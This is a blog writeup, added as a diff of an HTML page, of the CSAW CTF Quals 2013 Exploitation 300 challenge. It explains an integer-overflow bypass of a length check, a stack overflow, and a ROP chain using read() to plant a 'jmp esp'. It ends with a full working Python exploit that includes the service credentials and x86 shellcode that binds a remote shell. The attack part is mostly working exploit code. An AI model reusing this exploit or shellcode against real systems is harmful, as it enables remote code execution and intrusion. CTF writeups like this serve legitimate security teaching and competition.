@@ -1,0 +1,306 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>CSAW CTF Quals 2013 Exploitation 300 writeup - blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="That is a network service. I can connect it by netcat. then i must input username password and seomething else. After i analysis the service. I find &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net//csaw-ctf-quals-2013-exp300-writeup">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <div id="header-inner">
+    <span class="first"><a href="/">blue-lotus</a></span>
+    <span><a href="/about">about</a></span>
+    <span class="last"><a href="/atom.xml" title="subscribe via RSS">rss</a></span>
+  </div>
+</hgroup>
+
+</header>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">CSAW CTF Quals 2013 Exploitation 300 Writeup</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-09-24T00:00:00+08:00" pubdate data-updated="true">Sep 24<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>That is a network service. I can connect it by netcat. then i must input <strong>username</strong> <strong>password</strong> and seomething else.</p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/nclogin.png" alt="1" /></p>
+
+<p>After i analysis the service. I find out the process of login and i find the <strong>username</strong> and <strong>password</strong></p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/username.png" alt="2" /> <img src="http://www.blue-lotus.net/images/2013/password.png" alt="3" /> <img src="http://www.blue-lotus.net/images/2013/dbup.png" alt="4" /></p>
+
+<p>Then I input username and password. I input a number(<strong>size</strong>) and a string(<strong>buff</strong>). </p>
+
+<p>“size” &gt; 1 and “size” + 1 &lt; 0x400</p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/size.png" alt="5" /></p>
+
+<p>Then I input The buff and the buff must ASCII Characters.</p>
+
+<p>last the program will open a file. write it to the buff. If the length of buff is more than 0x400. write it to the top 1024 of buff.</p>
+
+<p>there will be overflow when the program recv the string which you input. but the length of buff must less than 0x400. </p>
+
+<p><code>
+0xffff + 1 == ； 0 0xffff == 65535
+</code></p>
+
+<p>now we can input any string which we want :)</p>
+
+<p>then i will write the exp.</p>
+
+<p><code>
+'A' * 0x420 + ret_address
+</code>
+there is not “jmp esp” in program when i use objdump. but the program use the function of read. i can use <strong>read</strong> to write “jmp esp” in static area.</p>
+
+<p>read(fd, buff, buffsize)</p>
+
+<p>read: call   80486e0 <a href="&#109;&#097;&#105;&#108;&#116;&#111;:&#114;&#101;&#097;&#100;&#064;&#112;&#108;&#116;">&#114;&#101;&#097;&#100;&#064;&#112;&#108;&#116;</a> </p>
+
+<p>fd:4 (the fd of client socket)</p>
+
+<p>read( 4, *0x080486e0, 2)</p>
+
+<p>now the send “jmp esp” and the program will write in memory.</p>
+
+<p><code>
+'A' * 0x420 + read + pop3ret + fd + static_area + "\x90" + shellcode
+</code></p>
+
+<p>now I did it.use the exp and use <strong>nc</strong> connect remote server.</p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/exp.png" alt="6" /></p>
+
+<p><img src="http://www.blue-lotus.net/images/2013/remote.png" alt="7" /></p>
+
+<h2 id="exp">Exp</h2>
+
+<div><div class="CodeRay">
+  <div class="code"><pre><span class="keyword">import</span> <span class="include">sys</span>, <span class="include">os</span>, <span class="include">time</span>, <span class="include">struct</span>, <span class="include">socket</span>
+
+<span class="keyword">def</span> <span class="function">p32</span>(addr):
+    <span class="keyword">return</span> struct.pack(<span class="string"><span class="delimiter">&quot;</span><span class="content">&lt;I</span><span class="delimiter">&quot;</span></span>, addr)
+
+<span class="keyword">def</span> <span class="function">r</span>(s, t=<span class="float">0.1</span>):
+    time.sleep(t)
+    <span class="keyword">return</span> s.recv(<span class="integer">8192</span>)
+
+<span class="keyword">def</span> <span class="function">se</span>(s, buf):
+    s.send(buf)
+
+HOST = <span class="string"><span class="delimiter">&quot;</span><span class="content">128.238.66.217</span><span class="delimiter">&quot;</span></span>
+HOST = <span class="string"><span class="delimiter">&quot;</span><span class="content">192.168.1.180</span><span class="delimiter">&quot;</span></span>
+PORT = <span class="integer">34266</span>
+
+SHELLCODE = \
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x31</span><span class="char">\xdb</span><span class="char">\xf7</span><span class="char">\xe3</span><span class="char">\x53</span><span class="char">\x43</span><span class="char">\x53</span><span class="char">\x6a</span><span class="char">\x02</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\xb0</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x5b</span><span class="char">\x5e</span><span class="char">\x52</span><span class="char">\x68</span><span class="char">\x02</span><span class="char">\x00</span><span class="char">\x11</span><span class="char">\x5c</span><span class="char">\x6a</span><span class="char">\x10</span><span class="char">\x51</span><span class="char">\x50</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\x6a</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x66</span><span class="char">\x58</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x89</span><span class="char">\x41</span><span class="char">\x04</span><span class="char">\xb3</span><span class="char">\x04</span><span class="char">\xb0</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x43</span><span class="char">\xb0</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x66</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x93</span><span class="char">\x59</span><span class="char">\x6a</span><span class="char">\x3f</span><span class="char">\x58</span><span class="char">\xcd</span><span class="char">\x80</span><span class="char">\x49</span><span class="char">\x79</span><span class="char">\xf8</span><span class="char">\x68</span><span class="char">\x2f</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x2f</span><span class="char">\x73</span><span class="char">\x68</span><span class="char">\x68</span><span class="char">\x2f</span><span class="char">\x62</span><span class="char">\x69</span><span class="char">\x6e</span><span class="char">\x89</span><span class="char">\xe3</span><span class="char">\x50</span><span class="char">\x53</span><span class="char">\x89</span><span class="char">\xe1</span><span class="char">\xb0</span><span class="delimiter">&quot;</span></span> +\
+<span class="string"><span class="delimiter">&quot;</span><span class="char">\x0b</span><span class="char">\xcd</span><span class="char">\x80</span><span class="delimiter">&quot;</span></span>
+
+s = socket.socket()
+s.connect((HOST, PORT))
+
+<span class="keyword">print</span> r(s)
+se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">csaw2013</span><span class="delimiter">&quot;</span></span>)
+<span class="keyword">print</span> r(s)
+
+se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">S1mplePWD</span><span class="delimiter">&quot;</span></span>)
+<span class="keyword">print</span> r(s)
+se(s, <span class="string"><span class="delimiter">&quot;</span><span class="content">65535</span><span class="delimiter">&quot;</span></span>)
+read = p32(<span class="hex">0x80486e0</span>)
+pop3ret = p32(<span class="hex">0x8049110</span>)
+static = p32(<span class="hex">0x804b000</span>)
+fd = p32(<span class="integer">4</span>)
+jmpesp = <span class="string"><span class="delimiter">&quot;</span><span class="char">\xff</span><span class="char">\xe4</span><span class="delimiter">&quot;</span></span>
+buf = <span class="string"><span class="delimiter">&quot;</span><span class="content">A</span><span class="delimiter">&quot;</span></span> * (<span class="integer">1056</span> + <span class="integer">0</span>)
+buf = <span class="string"><span class="delimiter">&quot;</span><span class="content">A</span><span class="delimiter">&quot;</span></span> * <span class="hex">0x420</span>
+buf += read + pop3ret + fd + static + p32(<span class="integer">2</span>) + static + <span class="string"><span class="delimiter">&quot;</span><span class="char">\x90</span><span class="delimiter">&quot;</span></span> * <span class="integer">100</span> + SHELLCODE
+se(s, buf)
+time.sleep(<span class="integer">5</span>)
+se(s, jmpesp)
+<span class="keyword">print</span> <span class="string"><span class="delimiter">'</span><span class="content">OK!!!</span><span class="delimiter">'</span></span>
+</pre></div>
+</div>
+</div>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Adrian</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-09-24T00:00:00+08:00" pubdate data-updated="true">Sep 24<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/ctf/'>CTF</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/csaw-ctf-quals-2013-crypto500-writeup/" title="Previous Post: CSAW CTF Quals 2013 crypto500 writeup">&laquo; CSAW CTF Quals 2013 crypto500 writeup</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/csaw-ctf-quals-2013-exp300-writeup/">CSAW CTF Quals 2013 Exploitation 300 Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/csaw-ctf-quals-2013-crypto500-writeup/">CSAW CTF Quals 2013 Crypto500 Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-finals-2013-login/">ASIS CTF Finals 2013 Login</a>
+      </li>
+    
+      <li class="post">
+        <a href="/asis-ctf-memdump-writeup/">ASIS CTF Memdump Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/ufo-ctf-2013-reverse-keygenme-writeup/">UFO CTF 2013 Reverse &#8211; KeyGenMe Writeup</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - blue-lotus -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'bluelotus';
+      
+        
+        var disqus_script = 'count.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
